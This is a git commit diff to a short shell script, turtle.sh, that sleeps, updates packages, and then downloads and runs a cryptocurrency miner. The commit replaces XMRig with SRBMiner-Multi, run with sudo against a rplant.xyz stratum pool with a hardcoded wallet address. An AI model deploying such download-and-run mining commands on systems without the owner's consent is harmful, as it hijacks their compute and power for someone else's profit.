1bba2f92c7de004df29503cea179f939b9901b4a
Muhammed Diyadin Karabulut <68358195+mdk721@users.noreply.github.com>
2022-09-14 19:54:09 +0300

    Update turtle.sh

--- turtle.sh
+++ turtle.sh
@@ -1,8 +1,6 @@
 #!/bin/sh
 sleep 15
 sudo apt update
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
-tar -xf xmrig-6.17.0-linux-x64.tar.gz
-cd xmrig-6.17.0
-./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BYcjnzYeQPijoF3aEB3oDmM2pz5UJetj4R.Rig-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 3 && sleep 3600
-sudo reboot
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.7/SRBMiner-Multi-1-0-7-Linux.tar.xz
+tar -xf SRBMiner-Multi-1-0-7-Linux.tar.xz
+sudo ./srbminer-multi --algorithm gr --pool stratum-eu.rplant.xyz:17075 --tls true --wallet Bj1GnWYL5sprwLJAt9Ep7dMh3z9p8JA9gg.mdk --keepalive true
